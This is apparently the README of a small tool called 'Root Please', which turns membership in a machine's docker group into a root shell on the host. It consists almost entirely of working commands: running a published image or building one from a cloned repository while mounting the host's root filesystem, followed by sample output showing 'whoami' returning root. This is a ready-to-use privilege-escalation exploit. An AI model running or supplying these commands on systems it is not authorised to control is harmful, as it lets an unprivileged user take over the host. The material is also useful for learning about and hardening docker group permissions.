Root Please
===========

If you're a member of the 'docker' group on a machine, this command gives you a root shell on the host OS. [See my blog post for details](https://fosterelli.co/privilege-escalation-via-docker.html).

How to Use
----------

Through Docker Hub:

```bash
> docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
```
 
Or through Github:

```bash
> git clone https://github.com/chrisfosterelli/dockerrootplease rootplease
> cd rootplease/
> docker build -t rootplease .
> docker run -v /:/hostOS -i -t rootplease
```

And the result:

```bash
johndoe@testmachine:~$ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
[...]
You should now have a root shell on the host OS
Press Ctrl-D to exit the docker instance / shell
# whoami
root
# 
```
